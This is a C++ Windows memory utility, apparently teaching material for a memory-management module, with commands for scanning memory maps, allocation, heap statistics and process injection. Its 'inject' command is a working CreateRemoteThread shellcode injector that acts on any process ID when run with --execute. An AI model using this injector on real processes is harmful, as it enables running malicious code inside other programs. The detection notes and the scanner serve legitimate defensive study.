// memory_toolkit.cpp
// Standalone memory utility for Module 06 — Memory Management.
// No external dependencies beyond Windows SDK + CRT.
//
// Compile:
//   g++ -std=c++17 -Wall -o memory_toolkit.exe memory_toolkit.cpp
//
// Usage:
//   memory_toolkit.exe scan [pid]
//       Dump memory map of process (or self). Prints all regions with
//       state/type/protection; flags executable private regions.
//
//   memory_toolkit.exe alloc <size> <flags>
//       Allocate memory in own process, write test pattern, verify, free.
//       flags: r | rw | rx | rwx
//
//   memory_toolkit.exe inject <pid> <shellcode_hex> [--execute]
//       Simulation of VirtualAllocEx / WriteProcessMemory / VirtualProtectEx /
//       CreateRemoteThread. Prints each step with addresses. Without --execute
//       the thread is NOT created. Pass --execute to perform the actual injection.
//
//   memory_toolkit.exe heap
//       Show current process heap stats via GetProcessHeaps + HeapWalk.

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <vector>
#include <string>

// ==========================================================================
// Utility helpers
// ==========================================================================

static const char* StateName(DWORD s)
{
    switch (s) {
        case MEM_FREE:    return "FREE   ";
        case MEM_RESERVE: return "RESERVE";
        case MEM_COMMIT:  return "COMMIT ";
        default:          return "???????";
    }
}

static const char* TypeName(DWORD t)
{
    switch (t) {
        case MEM_IMAGE:   return "IMAGE  ";
        case MEM_MAPPED:  return "MAPPED ";
        case MEM_PRIVATE: return "PRIVATE";
        default:          return "       ";
    }
}

static std::string ProtectStr(DWORD prot)
{
    if (prot == 0) return "---";
    DWORD base = prot & 0xFF;
    std::string s;
    switch (base) {
        case PAGE_NOACCESS:          s = "---"; break;
        case PAGE_READONLY:          s = "R--"; break;
        case PAGE_READWRITE:         s = "RW-"; break;
        case PAGE_WRITECOPY:         s = "RWC"; break;
        case PAGE_EXECUTE:           s = "--X"; break;
        case PAGE_EXECUTE_READ:      s = "R-X"; break;
        case PAGE_EXECUTE_READWRITE: s = "RWX"; break;
        case PAGE_EXECUTE_WRITECOPY: s = "RXC"; break;
        default:                     s = "???"; break;
    }
    if (prot & PAGE_GUARD)   s += "+G";
    if (prot & PAGE_NOCACHE) s += "+NC";
    return s;
}

static bool IsExecutable(DWORD prot)
{
    DWORD b = prot & 0xFF;
    return b == PAGE_EXECUTE || b == PAGE_EXECUTE_READ ||
           b == PAGE_EXECUTE_READWRITE || b == PAGE_EXECUTE_WRITECOPY;
}

static void Usage()
{
    puts("memory_toolkit.exe <command> [args]\n");
    puts("  scan [pid]                   — dump memory map (self if no pid)");
    puts("  alloc <size> <r|rw|rx|rwx>   — allocate, pattern-fill, verify, free");
    puts("  inject <pid> <hex> [--execute]");
    puts("                               — inject shellcode (simulation unless --execute)");
    puts("  heap                         — show process heap stats\n");
}

// ==========================================================================
// CMD: scan
// ==========================================================================

static int CmdScan(int argc, char* argv[])
{
    DWORD  pid      = GetCurrentProcessId();
    HANDLE hProc    = GetCurrentProcess();
    bool   remote   = false;

    if (argc >= 3) {
        pid = (DWORD)atoi(argv[2]);
        if (pid == 0) { fprintf(stderr, "[!] Invalid PID\n"); return 1; }
        hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                            FALSE, pid);
        if (!hProc) {
            fprintf(stderr, "[!] OpenProcess(PID=%lu) failed: %lu\n", pid, GetLastError());
            return 1;
        }
        remote = true;
    }

    printf("=== Memory Map — PID %lu ===\n\n", pid);
    printf("%-18s  %-14s  %-7s  %-7s  %-7s  %s\n",
           "BaseAddr", "Size", "State", "Type", "Prot", "Notes");
    printf("%-18s  %-14s  %-7s  %-7s  %-7s  %s\n",
           "------------------", "--------------",
           "-------", "-------", "-------", "-----");

    LPVOID  addr         = 0;
    SIZE_T  totalCommit  = 0;
    SIZE_T  privExecSize = 0;
    int     privExecCount= 0;

    while (true) {
        MEMORY_BASIC_INFORMATION mbi = {};
        if (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == 0) break;

        std::string prot = ProtectStr(mbi.Protect);
        bool flag = (mbi.State == MEM_COMMIT &&
                     mbi.Type  == MEM_PRIVATE &&
                     IsExecutable(mbi.Protect));

        printf("0x%016llX  %14llu  %s  %s  %-7s  %s\n",
               (unsigned long long)(uintptr_t)mbi.BaseAddress,
               (unsigned long long)mbi.RegionSize,
               StateName(mbi.State),
               TypeName(mbi.Type),
               prot.c_str(),
               flag ? "<< EXEC PRIVATE" : "");

        if (mbi.State == MEM_COMMIT) {
            totalCommit += mbi.RegionSize;
            if (flag) { privExecSize += mbi.RegionSize; privExecCount++; }
        }

        if (mbi.RegionSize == 0)
            addr = (LPVOID)((uintptr_t)addr + 0x1000);
        else
            addr = (LPVOID)((uintptr_t)mbi.BaseAddress + mbi.RegionSize);
        if ((uintptr_t)addr < (uintptr_t)mbi.BaseAddress) break;
    }

    printf("\n--- Summary ---\n");
    printf("  Total committed:            %llu bytes (%.2f MB)\n",
           (unsigned long long)totalCommit, totalCommit / (1024.0 * 1024.0));
    printf("  Private executable regions: %d region(s), %llu bytes\n",
           privExecCount, (unsigned long long)privExecSize);
    if (privExecCount > 0)
        printf("  [!] Private executable regions detected — inspect for injected code.\n");
    else
        printf("  [OK] No private executable regions.\n");

    if (remote) CloseHandle(hProc);
    return 0;
}

// ==========================================================================
// CMD: alloc
// ==========================================================================

static int CmdAlloc(int argc, char* argv[])
{
    if (argc < 4) {
        fprintf(stderr, "Usage: alloc <size> <r|rw|rx|rwx>\n");
        return 1;
    }

    SIZE_T size = (SIZE_T)atoi(argv[2]);
    if (size == 0 || size > 64 * 1024 * 1024) {
        fprintf(stderr, "[!] Size must be 1–67108864\n"); return 1;
    }

    const char* flagStr = argv[3];
    DWORD prot = 0;
    if (strcmp(flagStr, "r")   == 0) prot = PAGE_READONLY;
    else if (strcmp(flagStr, "rw")  == 0) prot = PAGE_READWRITE;
    else if (strcmp(flagStr, "rx")  == 0) prot = PAGE_EXECUTE_READ;
    else if (strcmp(flagStr, "rwx") == 0) prot = PAGE_EXECUTE_READWRITE;
    else { fprintf(stderr, "[!] Unknown flags: %s (use r/rw/rx/rwx)\n", flagStr); return 1; }

    printf("=== alloc: size=%llu flags=%s ===\n\n",
           (unsigned long long)size, flagStr);

    // Always allocate RW first for filling, then change to requested prot.
    LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { fprintf(stderr, "[!] VirtualAlloc failed: %lu\n", GetLastError()); return 1; }
    printf("[+] VirtualAlloc(RW) → 0x%p  size=%llu\n", mem, (unsigned long long)size);

    // Write test pattern (repeating 0xAA..0xFF cycle).
    BYTE* p = (BYTE*)mem;
    for (SIZE_T i = 0; i < size; i++) p[i] = (BYTE)(0xAA + (i % 0x56));
    printf("[+] Pattern written to 0x%p\n", mem);

    // Change protection to requested.
    if (prot != PAGE_READWRITE) {
        DWORD old = 0;
        if (!VirtualProtect(mem, size, prot, &old)) {
            fprintf(stderr, "[!] VirtualProtect failed: %lu\n", GetLastError());
            VirtualFree(mem, 0, MEM_RELEASE);
            return 1;
        }
        printf("[+] VirtualProtect RW → %s\n", flagStr);
    }

    // Verify: only possible if region is still readable.
    DWORD curProt = 0;
    {
        MEMORY_BASIC_INFORMATION mbi = {};
        VirtualQuery(mem, &mbi, sizeof(mbi));
        curProt = mbi.Protect & 0xFF;
    }
    bool canRead = (curProt == PAGE_READONLY ||
                    curProt == PAGE_READWRITE ||
                    curProt == PAGE_EXECUTE_READ ||
                    curProt == PAGE_EXECUTE_READWRITE ||
                    curProt == PAGE_EXECUTE_WRITECOPY ||
                    curProt == PAGE_WRITECOPY);

    if (canRead) {
        bool ok = true;
        for (SIZE_T i = 0; i < size; i++) {
            if (p[i] != (BYTE)(0xAA + (i % 0x56))) { ok = false; break; }
        }
        printf("[+] Pattern verify: %s\n", ok ? "PASS" : "FAIL");
    } else {
        printf("[~] Pattern not verified (region is not readable with protect=%s)\n",
               ProtectStr(prot).c_str());
    }

    printf("[+] First 16 bytes: ");
    if (canRead) {
        for (int i = 0; i < 16 && (SIZE_T)i < size; i++) printf("%02X ", p[i]);
        printf("\n");
    } else {
        printf("<not readable>\n");
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[+] VirtualFree OK\n");
    return 0;
}

// ==========================================================================
// CMD: inject
// ==========================================================================

// Parse hex string "31C0C3..." into byte vector.
static bool HexToBytes(const char* hex, std::vector<BYTE>& out)
{
    size_t len = strlen(hex);
    if (len % 2 != 0) return false;
    for (size_t i = 0; i < len; i += 2) {
        char byte_str[3] = { hex[i], hex[i+1], 0 };
        char* end = nullptr;
        long val = strtol(byte_str, &end, 16);
        if (*end != 0) return false;
        out.push_back((BYTE)val);
    }
    return true;
}

static int CmdInject(int argc, char* argv[])
{
    if (argc < 4) {
        fprintf(stderr, "Usage: inject <pid> <shellcode_hex> [--execute]\n");
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[2]);
    if (pid == 0) { fprintf(stderr, "[!] Invalid PID\n"); return 1; }

    std::vector<BYTE> sc;
    if (!HexToBytes(argv[3], sc) || sc.empty()) {
        fprintf(stderr, "[!] Invalid shellcode hex string\n"); return 1;
    }

    bool doExecute = false;
    for (int i = 4; i < argc; i++)
        if (strcmp(argv[i], "--execute") == 0) { doExecute = true; break; }

    printf("=== inject: PID=%lu  shellcode=%zu bytes  execute=%s ===\n\n",
           pid, sc.size(), doExecute ? "YES" : "NO (simulation)");
    if (!doExecute)
        printf("[~] Simulation mode. Pass --execute to perform actual injection.\n\n");

    // Step 1: Open target process.
    printf("[STEP 1] OpenProcess(PROCESS_ALL_ACCESS, PID=%lu)\n", pid);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        fprintf(stderr, "         Failed: %lu\n", GetLastError());
        return 1;
    }
    printf("         hProcess = 0x%p\n", hProc);

    // Step 2: Allocate RW memory in target.
    printf("\n[STEP 2] VirtualAllocEx(hProcess, NULL, %zu, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)\n",
           sc.size());
    LPVOID remoteMem = NULL;
    if (doExecute) {
        remoteMem = VirtualAllocEx(hProc, NULL, sc.size(),
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) {
            fprintf(stderr, "         Failed: %lu\n", GetLastError());
            CloseHandle(hProc);
            return 1;
        }
        printf("         Remote base = 0x%p\n", remoteMem);
    } else {
        printf("         [SIM] Would allocate %zu bytes in PID %lu\n", sc.size(), pid);
        remoteMem = (LPVOID)0xDEADBEEF00000000ULL; // simulated address
    }

    // Step 3: WriteProcessMemory.
    printf("\n[STEP 3] WriteProcessMemory(hProcess, 0x%p, shellcode, %zu)\n",
           remoteMem, sc.size());
    if (doExecute) {
        SIZE_T written = 0;
        if (!WriteProcessMemory(hProc, remoteMem, sc.data(), sc.size(), &written)) {
            fprintf(stderr, "         Failed: %lu\n", GetLastError());
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return 1;
        }
        printf("         Wrote %llu/%zu bytes\n", (unsigned long long)written, sc.size());
    } else {
        printf("         [SIM] Would write %zu bytes to 0x%p\n", sc.size(), remoteMem);
    }

    // Step 4: VirtualProtectEx RW → RX.
    printf("\n[STEP 4] VirtualProtectEx(hProcess, 0x%p, %zu, PAGE_EXECUTE_READ)\n",
           remoteMem, sc.size());
    if (doExecute) {
        DWORD old = 0;
        if (!VirtualProtectEx(hProc, remoteMem, sc.size(), PAGE_EXECUTE_READ, &old)) {
            fprintf(stderr, "         Failed: %lu\n", GetLastError());
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return 1;
        }
        printf("         Old protect was: %s\n", ProtectStr(old).c_str());
    } else {
        printf("         [SIM] Would change RW → PAGE_EXECUTE_READ at 0x%p\n", remoteMem);
    }

    // Step 5: CreateRemoteThread.
    printf("\n[STEP 5] CreateRemoteThread(hProcess, NULL, 0, 0x%p, NULL, 0)\n", remoteMem);
    if (doExecute) {
        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                            (LPTHREAD_START_ROUTINE)remoteMem,
                                            NULL, 0, NULL);
        if (!hThread) {
            fprintf(stderr, "         Failed: %lu\n", GetLastError());
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return 1;
        }
        printf("         hThread = 0x%p\n", hThread);
        printf("         Waiting for remote thread to finish...\n");
        WaitForSingleObject(hThread, 5000);
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        printf("         Thread exit code: %lu\n", exitCode);
        CloseHandle(hThread);
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
    } else {
        printf("         [SIM] Would start remote thread at 0x%p\n", remoteMem);
        printf("\n[SIM] Injection steps complete (no actual execution).\n");
        printf("      Pass --execute to perform real injection.\n");
    }

    CloseHandle(hProc);

    printf("\n--- Injection Technique Notes ---\n");
    printf("  CreateRemoteThread is the classic injection technique (T1055.001).\n");
    printf("  Defenders detect:\n");
    printf("    1. OpenProcess with PROCESS_ALL_ACCESS from a non-parent process\n");
    printf("    2. VirtualAllocEx creating PRIVATE regions in another process\n");
    printf("    3. WriteProcessMemory cross-process writes\n");
    printf("    4. CreateRemoteThread with start address in PRIVATE memory\n");
    return 0;
}

// ==========================================================================
// CMD: heap
// ==========================================================================

static int CmdHeap()
{
    printf("=== Process Heap Statistics ===\n\n");

    // Get all heap handles.
    DWORD heapCount = GetProcessHeaps(0, NULL);
    std::vector<HANDLE> heaps(heapCount);
    GetProcessHeaps(heapCount, heaps.data());

    printf("Process heap count: %lu\n\n", heapCount);

    SIZE_T grandTotalAlloc = 0;
    SIZE_T grandTotalFree  = 0;

    for (DWORD i = 0; i < heapCount; i++) {
        HANDLE h = heaps[i];
        bool isDefault = (h == GetProcessHeap());

        printf("Heap[%lu] handle=0x%p  %s\n", i, h,
               isDefault ? "(default process heap)" : "");

        // Lock the heap before walking it.
        if (!HeapLock(h)) {
            printf("  [!] HeapLock failed: %lu — skipping\n", GetLastError());
            continue;
        }

        PROCESS_HEAP_ENTRY entry = {};
        entry.lpData = NULL;

        SIZE_T allocBlocks = 0, allocBytes = 0;
        SIZE_T freeBlocks  = 0, freeBytes  = 0;
        bool walkFailed = false;

        while (HeapWalk(h, &entry)) {
            if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
                allocBlocks++;
                allocBytes += entry.cbData;
            } else if (!(entry.wFlags & PROCESS_HEAP_REGION) &&
                       !(entry.wFlags & PROCESS_HEAP_UNCOMMITTED_RANGE)) {
                freeBlocks++;
                freeBytes += entry.cbData;
            }
        }

        DWORD walkErr = GetLastError();
        if (walkErr != ERROR_NO_MORE_ITEMS) {
            printf("  [!] HeapWalk ended with error: %lu\n", walkErr);
            walkFailed = true;
        }

        HeapUnlock(h);

        if (!walkFailed) {
            printf("  Allocated: %6llu blocks  %10llu bytes  (%.2f KB)\n",
                   (unsigned long long)allocBlocks,
                   (unsigned long long)allocBytes,
                   allocBytes / 1024.0);
            printf("  Free:      %6llu blocks  %10llu bytes  (%.2f KB)\n",
                   (unsigned long long)freeBlocks,
                   (unsigned long long)freeBytes,
                   freeBytes / 1024.0);
        }
        printf("\n");

        grandTotalAlloc += allocBytes;
        grandTotalFree  += freeBytes;
    }

    printf("--- Grand Total ---\n");
    printf("  All heaps allocated: %llu bytes (%.2f KB)\n",
           (unsigned long long)grandTotalAlloc, grandTotalAlloc / 1024.0);
    printf("  All heaps free:      %llu bytes (%.2f KB)\n",
           (unsigned long long)grandTotalFree, grandTotalFree / 1024.0);

    return 0;
}

// ==========================================================================
// main
// ==========================================================================

int main(int argc, char* argv[])
{
    if (argc < 2) { Usage(); return 1; }

    const char* cmd = argv[1];
    if (strcmp(cmd, "scan")   == 0) return CmdScan(argc, argv);
    if (strcmp(cmd, "alloc")  == 0) return CmdAlloc(argc, argv);
    if (strcmp(cmd, "inject") == 0) return CmdInject(argc, argv);
    if (strcmp(cmd, "heap")   == 0) return CmdHeap();

    fprintf(stderr, "[!] Unknown command: %s\n\n", cmd);
    Usage();
    return 1;
}
